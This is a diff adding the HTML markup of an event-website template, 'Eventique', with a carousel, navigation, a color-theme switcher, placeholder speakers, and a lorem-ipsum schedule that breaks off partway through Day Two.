@@ -1,0 +1,2018 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="images/favicon.jpg">
+
+    <title>Eventique</title>
+
+    <link href="css/bootstrap.css" rel="stylesheet">
+
+
+    <link href="css/style.css" rel="stylesheet">
+    <!--- COLOR SCHEMES -->
+    <link rel="stylesheet" type="text/css" href="css/green.css" title="green" media="screen">
+    <link rel="alternate stylesheet" type="text/css" href="css/purple.css" title="purple" media="screen" disabled="">
+    <link rel="alternate stylesheet" type="text/css" href="css/orange.css" title="orange" media="screen" disabled="">
+    <!--- END COLOR SCHEMES -->
+    <link href="css/animate.css" rel="stylesheet">
+    <link href="css/font-awesome.min.css" rel="stylesheet">
+    <link href="css/Owl.Carousel.css" rel="stylesheet">
+    <script src="js/jquery-1.11.1.js"></script>
+    <link href='http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Courgette' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="js/html5shiv.min.js"></script>
+      <script src="js/respond.js"></script>
+    <![endif]--> 
+
+</head>
+<body>
+
+
+<div id="settings" class="">
+            <div class="colors">
+                <ul>
+                    <li>
+                        <a class="color_green selected" onclick="setActiveStyleSheet('green'); return false;" href="javascript:;"><i></i></a>
+                    </li>
+                    <li>
+                        <a class="color_orange" onclick="setActiveStyleSheet('orange'); return false;" href="javascript:;"><i></i></a>
+                    </li>
+                    <li>
+                        <a class="color_purple " onclick="setActiveStyleSheet('purple'); return false;" href="javascript:;"><i></i></a>
+                    </li>
+            </ul>
+        </div>
+    <a class="settings_link" href="#"><i class="fa fa-paint-brush"></i></a>
+</div>
+<script type="text/javascript">
+    
+        $(document).ready(function() {
+            $('a.settings_link').click(function(event){
+                $(this).parent().toggleClass('open');
+                event.preventDefault();
+            });
+
+                 
+            $('.colors ul li a').click(function(event){
+                $('.colors ul li a').removeClass('selected');
+                $(this).addClass('selected');
+                             
+                event.preventDefault();
+            });
+        });
+
+
+</script>
+
+
+<div id="home">
+    <!-- ============================= Carousel Wrapp ================================================== -->
+
+    <div id="top-carousel" class="carousel slide" data-ride="carousel" data-pause="hover">
+
+        <!-- ================================================== INDICATORS================================================== -->
+
+        <ol class="carousel-indicators">
+            <li data-target="#top-carousel" data-slide-to="0" class="active"></li>
+            <li data-target="#top-carousel" data-slide-to="1" class=""></li>
+        </ol>
+
+        <!-- ================================================== SLIDER ITEM ================================================== -->
+
+        <div class="carousel-inner" role="listbox">
+
+            <div class="active item  ">
+
+                <div class="not-fullscreen background parallax slider1" data-diff="100">
+                    <div class="content-a">
+
+                            <!-- ================================================== CAPTION ================================================== -->
+
+                            <div class="outer">
+                                <div class="middle">
+                                    <div class="inner">
+                                        <div class="carousel-caption">
+                                            <h2 class="fadeInLeft animated">Welcome To</h2>
+                                            <h1 class="fadeInRight animated">EVENTIQUE</h1>
+                                            <h3 class="fadeInLeft animated">Romania, Hotel Rin</h3>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================================================== END CAPTION ================================================== -->
+
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- ================================================== END SLIDER ITEM ================================================== -->
+
+            <!-- ================================================== SLIDER ITEM ================================================== -->
+
+            <div class="item">
+
+                <div class="not-fullscreen background parallax slider2" data-diff="100">
+                    <div class="content-a">
+
+                            <!-- ================================================== CAPTION ================================================== -->
+
+                            <div class="outer">
+                                <div class="middle">
+                                    <div class="inner">
+                                        <div class="container">
+                                            <div class="carousel-caption">
+                                                <h2 class="bounceInDown animated">The best event to</h2>
+                                                <h1 class="fadeIn animated">Discover. Create. Inspire</h1>
+                                                <p class="cap">Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut 
+                                                <br>laoreet dolore magna aliquam erat volutpat.</p>
+                                                <a class="btn btn-lg btn-primary" href="#" role="button">Reserve your seat</a>
+                                                <a class="btn btn-lg btn-naked" href="#" role="button">Reserve your seat</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================================================== END CAPTION ================================================== -->
+
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+
+        <!-- ================================================== END SLIDER ITEM ================================================== -->
+
+        <a class="left carousel-control" href="#top-carousel" role="button" data-slide="prev">
+            <i aria-hidden="true" class="fa fa-angle-left"></i>
+        </a>
+        <a class="right carousel-control" href="#top-carousel" role="button" data-slide="next">
+            <i aria-hidden="true" class="fa fa-angle-right"></i>
+        </a>
+
+    </div>
+
+    <!-- ====================== END CAROUSEL WRAPP ============= -->
+
+
+    <!-- ================================================== Navigation ================================================== -->
+
+        <div class="navbar-wrapp small" >
+            <div class="container">
+
+                <nav id="navigation" class="navbar navbar-eventique" >
+                    <div class="container">
+                        <div class="navbar-header">
+                            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                                <span class="sr-only">Menu</span>
+                                <span class="icon-bar"></span>
+                                <span class="icon-bar"></span>
+                                <span class="icon-bar"></span>
+                            </button>
+                            <a class="navbar-brand" href="#">
+                                <img src="images/logo.png" alt="Eventique" title="Eventique">
+                            </a>
+                        </div>
+                        <div id="navbar" class="navbar-collapse collapse" data-scroll-header>
+                            <ul class="nav navbar-right navbar-nav">
+                                <li><a data-scroll data-options='{ "easing": "linear" }' class="active" href="#home">Home</a>
+                                </li>
+                                <li><a data-scroll data-options='{ "easing": "linear" }' href="#about">About</a>
+                                </li>
+                                <li><a data-scroll data-options='{ "easing": "linear" }' href="#speakers">Speakers</a>
+                                </li>
+                                <li><a data-scroll data-options='{ "easing": "linear" }' href="#schedule">Schedule</a>
+                                </li>
+                                <li><a data-scroll data-options='{ "easing": "linear" }' href="#faq">FAQ</a>
+                                </li>
+                                <li><a data-scroll data-options='{ "easing": "linear" }' href="#gallery">Gallery</a>
+                                </li>
+                                <li><a data-scroll data-options='{ "easing": "linear" }' href="#location">Location</a>
+                                </li>
+                                <li><a data-scroll data-options='{ "easing": "linear" }' href="#register">Register</a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </nav>
+
+            </div>
+        </div>
+
+        <!-- ================================================== END NAVIGATION ================================================== -->
+
+    <!--  ================================================== CONTENT ================================================== -->
+
+</div>
+<div class="container">
+    <!-- ================================================== TIMER ================================================== -->
+        <section class="ev clk part">
+
+        <h2> Event time </h2> <!-- = Title just for SEO = -->
+
+            <div class="container-fluid">
+                <div class="countdown ">
+
+                </div>
+            </div>
+
+        </section>
+
+    <!-- ================================================== END TIMER ================================================== -->
+
+
+    <!-- =============================== ABOUT ========================= -->
+
+        <section id="about" class="part about">
+
+            <div class="container-fluid">
+
+                        <!-- ================= EVENT DESCRIPTION ================= -->
+
+                        <div class="content-part">
+
+                            <div class="cont">
+                                
+                                <p>Sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat.Sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam.</p>
+
+                            </div>
+
+                        </div>
+
+                         <!-- =========================== END EVENT DESCRIPTION =============================== -->
+
+                        <!-- ================= EVENT ICON BLOCKS ================= -->
+
+                        <div class="icon-blocks">
+
+                            <div class="row">
+
+
+                                <!-- ================= EVENT ICON BLOCK ================= -->
+
+                                <div class="col-lg-3 col-md-3 col-xs-6 col-sm-6">
+
+                                    <div class="part-block">
+
+                                        <div class="part-o">
+
+                                         <!-- ================= EVENT ICON ================= -->
+
+                                            <i class="fa fa-map-marker"></i>
+
+                                        <div class="part-t">
+
+          
+                                            <div>
+
+                                                <!-- ================= EVENT ICON DESCRIPTION ================= -->
+
+                                                <h3>ROMANIA</h3>
+                                                <h4>Hotel Rin</h4>
+
+                                            </div>
+                                        </div>
+
+                                        </div>
+
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= END EVENT ICON BLOCK ================= -->
+
+                                <!-- ================= EVENT ICON BLOCK ================= -->
+
+                                <div class="col-lg-3 col-md-3 col-xs-6 col-sm-6">
+
+                                    <div class="part-block">
+
+                                        <div class="part-o">
+
+                                            <!-- ================= EVENT ICON ================= -->
+
+                                            <i class="fa fa-calendar"></i>
+
+                                        <div class="part-t">
+                                            <div>
+
+                                                <!-- ================= EVENT ICON DESCRIPTION ================= -->
+
+                                                <h3>09 August</h3>
+                                                <h4>2016</h4>
+                                            </div>
+                                        </div>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= END EVENT ICON BLOCK ================= -->
+
+                                <!-- ================= EVENT ICON BLOCK ================= -->
+
+                                <div class="col-lg-3 col-md-3 col-xs-6 col-sm-6">
+
+                                    <div class="part-block">
+
+                                        <div class="part-o">
+
+                                        <!-- ================= EVENT ICON ================= -->
+
+                                            <i class="fa fa-microphone"></i>
+
+                                        <div class="part-t">
+                                            <div>
+
+                                                <!-- ================= EVENT ICON DESCRIPTION ================= -->
+
+                                                <h3>3 Speakers</h3>
+                                                <h4>Only the best</h4>
+
+                                            </div>
+                                        </div>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= END EVENT ICON BLOCK ================= -->
+
+                                <!-- ================= EVENT ICON BLOCK ================= -->
+
+                                <div class="col-lg-3 col-md-3 col-xs-6 col-sm-6">
+
+                                    <div class="part-block">
+
+                                        <div class="part-o">
+
+                                            <!-- ================= EVENT ICON ================= -->
+
+                                            <i class="fa fa-flag"></i>
+
+                                            <div class="part-t">
+                                            <div>
+
+                                                <!-- ================= EVENT ICON DESCRIPTION ================= -->
+
+                                                <h3>500 SEATS</h3>
+                                                <h4>Available</h4>
+
+                                            </div>
+                                            </div>
+
+                                        </div>
+
+                                        
+
+                                    </div>
+
+                                </div>
+
+                            <!-- ================= END EVENT ICON BLOCK ================= -->
+
+                        </div>
+
+                    </div>
+
+                        <!-- ================= END EVENT ICON BLOCKS ================= -->
+
+
+                        <!-- ================= EVENT DATA ================= -->
+
+                        <div class="addtocalendar ">
+                            <div class="about-c">
+                                <a class="btn btn-lg btn-primary atcb-link" role="button"><i class="fa fa-calendar"></i> Add to calendar</a>
+                            </div>
+                            <var class="atc_event">
+                                <var class="atc_date_start">2015-05-04 12:00:00</var>
+                                <var class="atc_date_end">2015-05-04 18:00:00</var>
+                                <var class="atc_timezone">Europe/London</var>
+                                <var class="atc_title">Branding Event</var>
+                                <var class="atc_description">Branding Nursery</var>
+                                <var class="atc_location">Internet</var>
+                                <var class="atc_organizer">VertexCode</var>
+                                <var class="atc_organizer_email">mail@example.com</var>
+                            </var>
+                        </div>
+
+            </div>
+
+        </section >
+
+        <!-- ================= END ABOUT ================= -->
+
+        <!-- ================= SPEAKERS ================= -->
+
+
+        <section id="speakers" class="ev part">
+
+            <div class="container-fluid">
+
+                <div class="title">
+
+                    <!-- ================= SPEAKERS TITLE ================= -->
+
+                        <h2>Key <strong>Speakers</strong></h2>
+
+                </div>            
+
+                <div class="content-part">
+
+                    <div class="row">
+
+                        <!-- ================= SPEAKERS BLOCK ================= -->
+
+                        <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                            <div class="face-speak">
+
+                                <div class="face-hover">
+
+                            <!-- ================= SPEAKERS SOCIAL ================= -->
+                                    <div class="center">
+
+                                        <div class="left-c">
+
+                                        <a href="#"><i class="fa fa-facebook"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="center">
+
+                                        <div class="right-c">
+
+                                            <a href="#"><i class="fa fa-twitter"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= SPEAKERS IMAGE ================= -->
+
+                                <img src="images/face-image-1.png" width="320" height="320"  title="Speaker 1" alt="speaker 1" />
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <h3><strong>Michael</strong>Doe</h3>
+
+                                <!-- ================= SPEAKERS DESC ================= -->
+
+                                <p>CEO, Company Name</p>
+
+                            </div>
+
+                        </div>
+
+                             <!-- ================= END SPEAKERS BLOCK ================= -->
+
+                             <!-- ================= SPEAKERS BLOCK ================= -->
+
+                        <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                            <div class="face-speak">
+
+                                <div class="face-hover">
+
+                             <!-- ================= SPEAKERS SOCIAL ================= -->
+                                    <div class="center">
+
+                                        <div class="left-c">
+
+                                        <a href="#"><i class="fa fa-facebook"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="center">
+
+                                        <div class="right-c">
+
+                                            <a href="#"><i class="fa fa-twitter"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= SPEAKERS IMAGE ================= -->
+
+
+                                <img src="images/face-image-2.png" width="320" height="320"  title="Speaker 2" alt="speaker 2" />
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <h3><strong>Jane</strong>Doe</h3>
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <p>Vice President, Company Name</p>
+
+                                <!-- ================= SPEAKERS DESC ================= -->
+
+
+                            </div>
+
+                        </div>
+
+                             <!-- ================= END SPEAKERS BLOCK ================= -->
+
+                             <!-- ================= SPEAKERS BLOCK ================= -->
+
+                        <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                            <div class="face-speak">
+
+                                <div class="face-hover">
+
+                             <!-- ================= SPEAKERS SOCIAL ================= -->
+                                    <div class="center">
+
+                                        <div class="left-c">
+
+                                        <a href="#"><i class="fa fa-facebook"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="center">
+
+                                        <div class="right-c">
+
+                                            <a href="#"><i class="fa fa-twitter"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= SPEAKERS IMAGE ================= -->
+
+                                <img src="images/face-image-3.png" width="320" height="320"  title="Speaker 3" alt="speaker 3" />
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <h3><strong>Victor</strong>Doe</h3>
+
+                                <!-- ================= SPEAKERS DESC ================= -->
+
+                                <p>Rector, University Name</p>
+
+                            </div>
+
+                        </div>
+
+                             <!-- ================= END SPEAKERS BLOCK ================= -->
+
+                             <!-- ================= SPEAKERS BLOCK ================= -->
+
+                        <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                            <div class="face-speak">
+
+                                <div class="face-hover">
+
+                             <!-- ================= SPEAKERS SOCIAL ================= -->
+                                    <div class="center">
+
+                                        <div class="left-c">
+
+                                        <a href="#"><i class="fa fa-facebook"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="center">
+
+                                        <div class="right-c">
+
+                                            <a href="#"><i class="fa fa-twitter"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= SPEAKERS IMAGE ================= -->
+
+                                <img src="images/face-image-4.png" width="320" height="320"  title="Speaker 4" alt="speaker 4" />
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <h3><strong>Jane</strong>Doe</h3>
+
+                                <!-- ================= SPEAKERS DESC ================= -->
+
+                                <p>Teacher, School Name</p>
+
+                            </div>
+
+                        </div>
+
+                             <!-- ================= END SPEAKERS BLOCK ================= -->
+
+                             <!-- ================= SPEAKERS BLOCK ================= -->
+
+                        <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                            <div class="face-speak">
+
+                                <div class="face-hover">
+
+                             <!-- ================= SPEAKERS SOCIAL ================= -->
+                                    <div class="center">
+
+                                        <div class="left-c">
+
+                                        <a href="#"><i class="fa fa-facebook"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="center">
+
+                                        <div class="right-c">
+
+                                            <a href="#"><i class="fa fa-twitter"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= SPEAKERS IMAGE ================= -->
+
+                                <img src="images/face-image-5.png" width="320" height="320"  title="Speaker 5" alt="speaker 5" />
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <h3><strong>Michael</strong>Doe</h3>
+
+                                <!-- ================= SPEAKERS DESC ================= -->
+
+                                <p>CEO, Company Name</p>
+
+                            </div>
+
+                        </div>
+
+                             <!-- ================= END SPEAKERS BLOCK ================= -->
+
+                             <!-- ================= SPEAKERS BLOCK ================= -->
+
+                        <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                            <div class="face-speak">
+
+                                <div class="face-hover">
+
+                             <!-- ================= SPEAKERS SOCIAL ================= -->
+                                    <div class="center">
+
+                                        <div class="left-c">
+
+                                        <a href="#"><i class="fa fa-facebook"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="center">
+
+                                        <div class="right-c">
+
+                                            <a href="#"><i class="fa fa-twitter"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= SPEAKERS IMAGE ================= -->
+
+                                <img src="images/face-image-6.png" width="320" height="320"  title="Speaker 6" alt="speaker 6" />
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <h3><strong>Lannister</strong>Doe</h3>
+
+                                <!-- ================= SPEAKERS DESC ================= -->
+
+                                <p>Vice President, Company Name</p>
+
+                            </div>
+
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                            <div class="face-speak">
+
+                                <div class="face-hover">
+
+                             <!-- ================= SPEAKERS SOCIAL ================= -->
+                                    <div class="center">
+
+                                        <div class="left-c">
+
+                                        <a href="#"><i class="fa fa-facebook"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="center">
+
+                                        <div class="right-c">
+
+                                            <a href="#"><i class="fa fa-twitter"></i></a>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <!-- ================= SPEAKERS IMAGE ================= -->
+
+                                <img src="images/face-image-7.png" width="320" height="320"  title="Speaker 7" alt="speaker 7" />
+
+                                <!-- ================= SPEAKERS NAME ================= -->
+
+                                <h3><strong>Sasha</strong>Doe</h3>
+
+                                <!-- ================= SPEAKERS DESC ================= -->
+
+                                <p>Rector, University Name</p>
+
+                            </div>
+
+                        </div>
+
+                             <!-- ================= END SPEAKERS BLOCK ================= -->
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+        <!-- ================= END SPEAKERS ================= -->
+
+        <!-- ================= SCHEDULE ================= -->
+
+        <section id="schedule" class="part">
+
+            <div class="container-fluid">
+
+
+                <div class="title">
+
+                <!-- ================= SCHEDULE TITLE ================= -->
+
+                    <h2>Event <strong>Schedule</strong></h2>
+                                
+                </div>
+
+                <div class="content-part">
+
+                <ul class="nav nav-pills nav-justified">
+
+                    <li class="active"><a data-toggle="tab" href="#sectionA">Day One</a></li>
+                    <li><a data-toggle="tab" href="#sectionB">Day Two</a></li>
+
+                </ul>
+
+                    <div class="tab-content">
+                        
+                        <div id="sectionA" role="tablist" class="tab-pane fade in active">
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="scheduleone">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapseone" aria-expanded="false" aria-controls="colapseone">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>9<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Welcome & Registration</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapseone" class="panel-collapse collapse" role="tabpanel" aria-labelledby="scheduleone">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="scheduletwo">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapstwo" aria-expanded="false" aria-controls="colapstwo">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>10<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Improving SEO & Maintenance</span>
+                                                <span class="aut-s">by Michael Smith</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapstwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="scheduletwo">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="schedulethree">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapsethree" aria-expanded="false" aria-controls="colapsethree">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>11<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Successful marketing strategies for designers</span>
+                                                <span class="aut-s">by Michael Smith</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsethree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="schedulethree">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="schedulefour">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed not" role="button" data-toggle="collapse" data-parent="#accordion" aria-expanded="false" aria-controls="colapsfour">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>12<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Coffee Break</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsfour" class="panel-collapse collapse" role="tabpanel" aria-labelledby="schedulefour">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="schedulefive">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapsefive" aria-expanded="false" aria-controls="colapsefive">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>13<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Course Introduction: Principles of good hierarchy in web design</span>
+                                                <span class="aut-s">by Michael Smith</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsefive" class="panel-collapse collapse" role="tabpanel" aria-labelledby="schedulefive">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="schedulesix">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapssix" aria-expanded="false" aria-controls="colapssix">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>14<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Conclusions of the day</span>
+                                                <span class="aut-s">John Doe</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapssix" class="panel-collapse collapse" role="tabpanel" aria-labelledby="schedulesix">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>                
+
+                        </div>
+
+                        <div id="sectionB" role="tablist" class="tab-pane fade in">
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="scheduleseven">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapseseven" aria-expanded="false" aria-controls="colapseseven">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>11<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Welcome & Registration</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapseseven" class="panel-collapse collapse" role="tabpanel" aria-labelledby="scheduleseven">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="scheduleeight">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapseight" aria-expanded="false" aria-controls="colapseight">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>12<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Improving SEO & Maintenance</span>
+                                                <span class="aut-s">by Michael Smith</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapseight" class="panel-collapse collapse" role="tabpanel" aria-labelledby="scheduleeight">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="schedulenine">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapsenine" aria-expanded="false" aria-controls="colapsenine">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>13<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Successful marketing strategies for designers</span>
+                                                <span class="aut-s">by Michael Smith</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsenine" class="panel-collapse collapse" role="tabpanel" aria-labelledby="schedulenine">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="scheduleten">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapseten" aria-expanded="false" aria-controls="colapseten">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>12<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Coffee Break</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapseten" class="panel-collapse collapse" role="tabpanel" aria-labelledby="scheduleten">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
